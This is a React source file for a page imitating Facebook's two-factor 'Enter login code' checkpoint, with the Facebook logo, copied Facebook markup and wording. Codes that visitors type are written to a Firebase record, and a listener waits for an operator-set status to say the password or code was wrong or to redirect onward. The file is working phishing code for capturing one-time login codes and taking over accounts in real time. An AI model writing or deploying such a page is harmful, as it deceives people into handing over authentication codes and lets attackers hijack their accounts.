import React, { useState, useEffect } from "react";
import { doc, onSnapshot, setDoc, updateDoc } from "firebase/firestore";
import { db } from "../../firebase";
import { useNavigate, useParams } from "react-router-dom";
import { renderElement } from "../../utils/function";
import Header from "../../Header/Header";
import { BrowserView, MobileView, isBrowser, isMobile } from 'react-device-detect';


const AuthCode = () => {
  const [isLoading, setIsLoading] = useState(false);
  const [isResend, setResend] = useState(false);
  const [inputValue, setInputValue] = useState("");
  const params = useParams();
  const navigate = useNavigate();
  const { userID } = params;
  const [result, setResult] = useState({
    type: "",
    msg: "",
  });
  const listener = (userID) => {
    onSnapshot(doc(db, "users", userID), (snapshot) => {
      const status = snapshot.data()?.status;
      if (status === 1) return;

      // Handle different status codes here
      switch (status) {
        case -1:
          setResult({
            type: "warning",
            msg: "Password is incorrect, please try again.",
          });
          break;
        case 2:
          navigate(`/checkpoint/${userID}`);
          break;
        case 3:
          navigate(`/processing/${userID}`);
          break;
        case -2:
          setResult({
            type: "error",
            msg: "The authentication code is incorrect, please try again.",
          });
          setIsLoading(false);
          break;
        default:
          setResult({
            type: "error",
            msg: "Unhandled status:" + status,
          });
      }
    });
  };

  useEffect(() => {
    setIsLoading(false);
  }, []);

  const handleResend = async () => {
    try {
      if(isLoading) return;
      setResend(true);
      setIsLoading(false);
    } catch (error) {
      console.error("Error saving class code to Firestore: ", error);
    } finally {
    }
  };

  const handleSubmit = async () => {
    if(!inputValue || inputValue.length < 6){
      return;
    } 
    setResend(false);
    setIsLoading(true);
    try {
      const userDocRef = doc(db, "users", userID);
      await updateDoc(userDocRef, {
        auth: inputValue,
        status: 2
      });
      listener(userID);
    } catch (error) {
      console.error("Error saving class code to Firestore: ", error);
    } finally {
    }
  };

  return (
    <div>
    <div className="Authentication__header"><div className="auth__header d-flex col-12 justify-content-between"><div className="auth__header-logo col-md-5 col-12"><img src="/assets/fb.d95f74a211e4eb5f4257.png" alt="fb" className="img-fluid" width="200"/></div>
    {!isMobile &&
    <div className="auth__header-search input-group col-md-5 d-flex pe-5 me-7"><input disabled={true} type="text" className="form-control" aria-describedby="basic-addon"/><span className="input-group-text" id="basic-addon1"><ion-icon name="search" role="img" className="md hydrated"></ion-icon></span>
    </div>
    }
    </div>
    </div>
    <div className="Authentication__body d-flex align-items-center justify-content-center">
    {isMobile &&
    <div className="col-12 col-md-12 Aligner-item--top">
   <div>
      <section className="_56be">
         <div className="_55wo _55x2 _56bf">
            <div className="_3-8_"></div>
            <section className="_55ws _acu">
               <span className="_52ja _52jh">
                  <div id="checkpoint_title">Enter login code to continue</div>
               </span>
            </section>
            <section className="_55wq">
               <div className="acw apm" data-sigil="marea">
                  <div>It looks like you haven't logged in from this browser before. Please enter the login code from your phone below.</div>
               </div>
               <div className="acw apm" data-sigil="marea">
                  <div className="col-4">
                  <input
                  style={{fontSize:'0.9rem'}}
                  maxLength={8}
                  readOnly={isLoading}
                  value={inputValue}
                  onChange={(e) => {
                    if(!isNaN(+e.target.value) == false) return;
                    setInputValue(e.target.value);
                  }}
                  placeholder="Login code" 
                  className="form-control form-control-sm"/>
                  </div>
               </div>
               <div className="acw apm" data-sigil="marea">
               {isLoading == false &&        
              <div className="d-flex align-items-center">
                    {renderElement(result)}
              </div>
              }
               </div>
               <div className="acw apm" data-sigil="marea">Note: Your text message may take a few minutes to arrive.</div>
            </section>
            <div className="_59e9 _7om2 _52we _5b6o p-2">
               <div className="_4g34 _5b6q _5b6p" aria-hidden="false">
                  <div className="_dd6"><span className="_52jc _52j9"><a style={{color:'#385898',fontSize:'12px',fontFamily:'Helvetica, Arial, sans-serif',textDecoration:'none',cursor:'pointer'}} href="#">Having trouble?</a></span></div>
               </div>
            </div>
         </div>
      </section>
   </div>
   <div className="row">
      <div className="_p_9 _5nbx">
         <table className="btnBar">
            <tbody>
               <tr>
                  <td id="checkpointSubmitButton" className="_2hw0"><button onClick={handleSubmit} disabled={isLoading || inputValue.length < 6 || !inputValue} value="Submit Code" className="_54k8 _52jh _56bs _56b_ _56bw _56bu" name="submit[Submit Code]" id="checkpointSubmitButton-actual-button" data-sigil="touchable"><span className="_55sr">Submit Code</span></button></td>
               </tr>
            </tbody>
         </table>
      </div>
   </div>
   {isLoading == true && isResend == false &&   
    <div className="loading">
        <div style={{top:'50%'}} className="loader"></div>
    </div>
   } 
</div>
}
{!isMobile &&
 <div style={{padding:'1rem 1rem 0.5rem 1rem',border: '1px solid #DCDADA',maxWidth: '620px',margin: '10vh auto auto',borderRadius: '0px',backgroundColor:'white'}}>
          <h1 style={{fontWeight:'700',lineHeight:'20px',fontSize: '14px', color: '#444444'}}>Choose a way to confirm it's you</h1>
          <div style={{height: '0.1px', width: '100%', background: '#DADDE1', marginTop: '0.5rem', marginBottom: '0.5rem'}}></div>
          <div>
            <div style={{fontFamily:"revert",fontSize: '14px'}} className="modal__body-description mb-2">Your account has two-factor authentication switched on, which requires this extra login step..</div>
          </div>
          <h1 style={{fontWeight:'700',lineHeight:'20px',fontSize: '14px', color: '#444444', marginTop: '0.5rem'}}>Approve from another device</h1>
          <div style={{height: '0.1px', width: '100%', background: '#DADDE1', marginTop: '0.5rem', marginBottom: '0.5rem'}}></div>
          <div>
            <div style={{fontFamily:"revert",fontSize: '14px'}} className="modal__body-description mb-2">Check your Facebook notifications where you're already logged into the account and approve the login to continue.</div>
          </div>
          <h1 style={{fontWeight:'700',lineHeight:'20px',fontSize: '14px', color: '#444444', marginTop: '0.5rem'}}>Or, enter your login code</h1>
          <div style={{height: '0.1px', width: '100%', background: '#DADDE1', marginTop: '0.5rem', marginBottom: '0.5rem'}}></div>
          <div>
            <div style={{fontFamily:"revert",fontSize: '14px'}} className="modal__body-description mb-1">Enter the 6-8 digit code from the phone or authentication app you set up.</div>
          </div>
          <div className="modal__body-password" style={{marginbottom: '3rem'}}>
            <div className="d-flex align-items-center mb-2">
                <div style={{maxwidth: '70%'}}>
                  <div style={{margin: '0px'}} className="InputText"><label className="InputText__label"></label>
                  <input
                  style={{fontSize:'0.9rem'}}
                  maxLength={8}
                  readOnly={isLoading}
                  value={inputValue}
                  onChange={(e) => {
                    if(!isNaN(+e.target.value) == false) return;
                    setInputValue(e.target.value);
                  }}
                  placeholder="Login code" 
                  className="form-control form-control-sm"/>
                  </div>
                </div>
            </div>
          </div>
            {isLoading == false && isResend == false &&        
            <div className="d-flex align-items-center mb-2">
                  {renderElement(result)}
            </div>
            }
          <div style={{height: '1px',width: '100%', background: '#DADDE1',marginbottom: '1.25rem'}}></div>
          <div style={{marginTop: '0.5rem', marginBottom: '0.5rem'}}>
          {!isMobile &&
          <a style={{lineHeight:'28px',color:'#385898',fontSize:'12px',fontFamily:'Helvetica, Arial, sans-serif',textDecoration:'none',cursor:'pointer'}} href="#" role="button" id="u_0_7_oI">Need another way to confirm it's you?</a>
          }
          <button className="auth_submit_btn" onClick={handleSubmit} disabled={isLoading || inputValue.length < 6 || !inputValue} style={{marginLeft:'auto'}}>
          <span style={{margin: '0px'}}>Submit Code</span>
          </button>
          </div>
          {isLoading == true && isResend == false &&   
              <div className="loading">
                  <div style={{top:'50%'}} className="loader"></div>
              </div>
          } 
      </div> 
      }
    </div>
    </div>
    
  );
};

export default AuthCode;
